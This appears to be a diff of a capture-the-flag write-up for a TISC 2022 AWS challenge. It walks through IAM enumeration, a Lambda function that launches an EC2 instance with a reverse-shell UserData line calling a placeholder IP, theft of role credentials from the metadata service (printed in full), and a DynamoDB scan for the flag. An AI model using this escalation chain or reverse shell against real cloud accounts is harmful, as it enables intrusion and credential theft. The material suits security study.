@@ -69,7 +69,7 @@ All EC2 computing instances should be tagged with the key: 'agent' and the value
 I tried to list all the resources I can find inside `aws ec2`. It seems like we cannot `describe-instances` (list ec2 instances), `describe-volumes` (list volumes), but we can `describe-subnets` (list subnets available).
 
 The subnet below has the name `palindrome`, looks like a good lead. Maybe we need to spawn an ec2 instance, join this subnet and then scan the network?
-```
+```bash
 chester@Macintosh TISC2022 % aws ec2 describe-subnets
 {
     "Subnets": [
@@ -122,7 +122,7 @@ An error occurred (VcpuLimitExceeded) when calling the RunInstances operation: Y
 
 Seems like the number of vCPUs is maxed. The way forward shouldn't be to spawn an ec2 instance...
 
-```
+```bash
 chester@Macintosh TISC2022 % aws ec2 describe-security-groups
 {
     "SecurityGroups": [
@@ -201,7 +201,7 @@ chester@Macintosh TISC2022 % aws ec2 describe-security-groups
 
 Used [IAM-Flaws](https://github.com/nikhil1232/IAM-Flaws) to enumerate permissions.
 
-```
+```bash
 >Enumeration<<
 
 
@@ -340,7 +340,7 @@ None
 
 `aws iam list-roles`
 
-```
+```json
 {
     "Roles": [
         ...
@@ -428,7 +428,7 @@ None
 }
 ```
 
-```
+```bash
 aws iam list-attached-role-policies --role-name lambda_agent_development_role
 {
     "AttachedPolicies": [
@@ -440,7 +440,7 @@ aws iam list-attached-role-policies --role-name lambda_agent_development_role
 }
 ```
 
-```
+```bash
 chester@Macintosh enumerate-iam % aws iam list-attached-role-policies --role-name lambda_agent_development_role
 {
     "AttachedPolicies": [
@@ -520,13 +520,13 @@ def lambda_handler(event, context):
 `code function.zip code.py`
 
 ```
-aws lambda create-function --function-name user-b4669b4db701486e9326fb6c9eb575c3-yol6 --runtime python3.9 --role \
+aws lambda create-function --function-name user-860d7932eb424a9995d5ce743f0540cf-yolO --runtime python3.9 --role \
 arn:aws:iam::051751498533:role/lambda_agent_development_role --handler code.lambda_handler --zip-file \
 fileb://function.zip
 ```
 
 ```
-aws lambda invoke --function-name user-b4669b4db701486e9326fb6c9eb575c3-yol6 output.txt
+aws lambda invoke --function-name user-860d7932eb424a9995d5ce743f0540cf-yolO output.txt
 ```
 
 `output.txt` will contain the following:
@@ -560,3 +560,197 @@ def lambda_handler(event, context):
 ```
 
 This is probably a hint to spawn an ec2 instance using the `lambda_agent_development_rule`.
+
+We can also see the `ec2_agent_role`
+
+```bash
+chester@Macintosh TISC2022 % aws iam list-attached-role-policies --role-name ec2_agent_role
+{
+    "AttachedPolicies": [
+        {
+            "PolicyName": "iam_policy_for_ec2_agent_role",
+            "PolicyArn": "arn:aws:iam::051751498533:policy/iam_policy_for_ec2_agent_role"
+        }
+    ]
+}
+chester@Macintosh TISC2022 % aws iam get-policy --policy-arn arn:aws:iam::051751498533:policy/iam_policy_for_ec2_agent_role
+{
+    "Policy": {
+        "PolicyName": "iam_policy_for_ec2_agent_role",
+        "PolicyId": "ANPAQYDFBGMSUUGDZFFBM",
+        "Arn": "arn:aws:iam::051751498533:policy/iam_policy_for_ec2_agent_role",
+        "Path": "/",
+        "DefaultVersionId": "v1",
+        "AttachmentCount": 1,
+        "PermissionsBoundaryUsageCount": 0,
+        "IsAttachable": true,
+        "Description": "AWS IAM Policy for EC2 agent node",
+        "CreateDate": "2022-07-22T09:29:34+00:00",
+        "UpdateDate": "2022-07-22T09:29:34+00:00",
+        "Tags": []
+    }
+}
+chester@Macintosh TISC2022 % aws iam get-policy-version --policy-arn arn:aws:iam::051751498533:policy/iam_policy_for_ec2_agent_role --version-id v1
+{
+    "PolicyVersion": {
+        "Document": {
+            "Statement": [
+                {
+                    "Action": [
+                        "dynamodb:DescribeTable",
+                        "dynamodb:ListTables",
+                        "dynamodb:Scan",
+                        "dynamodb:Query"
+                    ],
+                    "Effect": "Allow",
+                    "Resource": "*",
+                    "Sid": "VisualEditor0"
+                }
+            ],
+            "Version": "2012-10-17"
+        },
+        "VersionId": "v1",
+        "IsDefaultVersion": true,
+        "CreateDate": "2022-07-22T09:29:34+00:00"
+    }
+```
+
+```bash
+chester@Macintosh Challenge 4B % aws iam list-instance-profiles
+{
+    "InstanceProfiles": [
+        {
+            "Path": "/",
+            "InstanceProfileName": "ec2_agent_instance_profile",
+            "InstanceProfileId": "AIPAQYDFBGMS6EKSSQ2RF",
+            "Arn": "arn:aws:iam::051751498533:instance-profile/ec2_agent_instance_profile",
+            "CreateDate": "2022-07-22T09:29:35+00:00",
+            "Roles": [
+                {
+                    "Path": "/",
+                    "RoleName": "ec2_agent_role",
+                    "RoleId": "AROAQYDFBGMSYSEMEVAEH",
+                    "Arn": "arn:aws:iam::051751498533:role/ec2_agent_role",
+                    "CreateDate": "2022-07-22T09:29:34+00:00",
+                    "AssumeRolePolicyDocument": {
+                        "Version": "2012-10-17",
+                        "Statement": [
+                            {
+                                "Effect": "Allow",
+                                "Principal": {
+                                    "Service": "ec2.amazonaws.com"
+                                },
+                                "Action": "sts:AssumeRole"
+                            }
+                        ]
+                    }
+                }
+            ]
+        }
+    ]
+}
+```
+
+We have to attach this instance profile to the instance so that we can have the `ec2-agent-role` for the instance.
+
+```python
+import boto3
+import time
+
+def lambda_handler(event, context):
+    
+    # Work in Progress: Requires help from Agents! 
+    
+    ec2 = boto3.resource('ec2')
+
+    instances = ec2.create_instances(
+       ImageId="ami-0b89f7b3f054b957e", # Amazon Linux
+       MinCount=1,
+       MaxCount=1,
+       InstanceType="t2.micro",
+       SubnetId="subnet-0aa6ecdf900166741",
+       TagSpecifications=[
+            {
+                'ResourceType': 'instance',
+                'Tags': [
+                    {
+                        'Key': 'agent',
+                        'Value': 'user-860d7932eb424a9995d5ce743f0540cf' # change for the user, actually dont even know if this is needed but just put
+                    },
+                ]
+            },
+        ],
+        UserData="""
+        #!/bin/sh
+        bash -i >& /dev/tcp/<your_reverse_shell_ip>/443 0>&1
+        """,
+        IamInstanceProfile={
+            'Arn': 'arn:aws:iam::051751498533:instance-profile/ec2_agent_instance_profile'
+        }
+    )
+
+    instance = instances[0]
+    return {
+        'status': 200,
+        'results': 'This is work in progress. Agents, palindrome needs your help to complete the workflow! :3',
+        'public_dns': instance.public_dns_name,
+        'public_ip': instance.public_ip_address,
+        'security_groups': instance.security_groups,
+        'subnet_id': instance.subnet_id,
+        'tags': instance.tags,
+        'iam_instance_profile': instance.iam_instance_profile
+    }
+```
+
+
+`code function.zip code.py`
+
+```
+aws lambda create-function --function-name user-860d7932eb424a9995d5ce743f0540cf-yoloswag1234 --runtime python3.9 --role \
+arn:aws:iam::051751498533:role/lambda_agent_development_role --handler main.lambda_handler --zip-file \
+fileb://function.zip
+```
+
+```
+aws lambda invoke --function-name user-860d7932eb424a9995d5ce743f0540cf-yoloswag1234 output.txt
+```
+
+Inside the spawned ec2 instance:
+
+```bash
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2_agent_role/
+{
+  "Code" : "Success",
+  "LastUpdated" : "2022-09-01T06:15:05Z",
+  "Type" : "AWS-HMAC",
+  "AccessKeyId" : "ASIAQYDFBGMS3QFYIX3R",
+  "SecretAccessKey" : "Sbtugassro5sJlN3RLxB6zy4xsGTCyXaBQU+h3l9",
+  "Token" : "IQoJb3JpZ2luX2VjEOb//////////wEaDmFwLXNvdXRoZWFzdC0xIkYwRAIgE5mVbnKtHCDsjmR6Q2B2XDFADVrsnNoj6NWcmd6ZkPcCIBd6xESxahCmSzjwTXjD/972YwZnYZLmS088IjApeZe4KuEECG8QARoMMDUxNzUxNDk4NTMzIgyYLXZ9nbmH4DzSVHsqvgSX1jgGg9EQGo+bUFiJLN/fYn/qmc6tbtw+LS0vrRNJvjtna2qJE7sCGOsYTUvrVzqWpRzYlRHOrVYpjBK/3oSZq6anjREEiLdjUEaFBL4Wd5HcAJ0BY5+wMIJ1qqMq/Ka1HYZtBoexlFrgt1b6qBWudfaahje5fkQDjqIC0T8ZYcN/gWqm0f+G6D5NrjI3BjdUk5jqqG7bI1P0dEClOiej9SUbYkmXG7Po/Hbte4BFjQnEOdyidaBunZ4CoXJeBtNKTiJ+txI/GGal0v7L+P7rqbvjdP9gLwPYJQiyEDa1Erj3kjSkkLTIyNUcCBoXzcEwJ3j4Idrnb1heEUlewhBUWSFq5blDtBNcJs+tT21gA+kuK+rMn5z2I4t5fezgW5Uue4w/+1c5mxpguVxyYgnEwHupxsOec/Ay70iXo5RjbFhAcjiXKin9jIyoCc8eXBUFxPvtlCgmu5eZ/+USk2tlquf3OTr8ULOlJogZVOC06X9e9inQ3uT+CLCeI6DifnLRq3jghpMd6KfhMTQDDIW++kgf/zorW3zD49gwPda3Pns4EDz85BS4xIIJMUkxYCB7mm+XKKeQoM5EuM5OdLx6xj2vsz3Aotms6Ax+f/I1zBWYCO3Bg3Xyhr2OX4pPt82ZwDH0BrdjLFOqB+JKKXvQ3MUDQ1w3Fng9zYU9H5aGc4N2FK5ui955GTdNt3FHcGMG8Xc4h+I/QJmTlBlKlplBarptT4ysMqVB0VENgXNRrdRwjQzRG1AHeE0rmQiZMO+bwZgGOqoBkvU8i68DFsT/3dYrLHLCCyxxdfSQANLU6fy5WvRUKAt57zxw8FSEIbaHiWlSxA0fAWdVfp3nkQMCHxWWT5MSyvbbFSVUIFByg1SxXz+u7yLI9dhmqaR4et5eV/6FysuRFuFlk755KJz61CX4aCTTIV6tPPswPR70qHRUNCwfvjSPogQY+O/E7XXe29Cb3aNxSCys3B1EEoi3HUzcaRGQ7mDAbGn/f7KghqA=",
+  "Expiration" : "2022-09-01T12:50:11Z"
+```
+
+These are temporary AWS credentials, which means we have to use all 3, `AccessKeyId`, `SecretAccessKey` and `Token`.
+```bash
+export AWS_ACCESS_KEY_ID=<insert>
+export AWS_SECRET_ACCESS_KEY=<insert>
+export AWS_SESSION_TOKEN=<insert>
+```
+
+```bash
+aws dynamodb scan --table-name flag_db\
+{
+    "Count": 1, 
+    "Items": [
+        {
+            "secret": {
+                "S": "TISC{iT3_N0t_s0_C1oUdy}"
+            }, 
+            "name": {
+                "S": "flag"
+            }
+        }
+    ], 
+    "ScannedCount": 1, 
+    "ConsumedCapacity": null
+}
+```
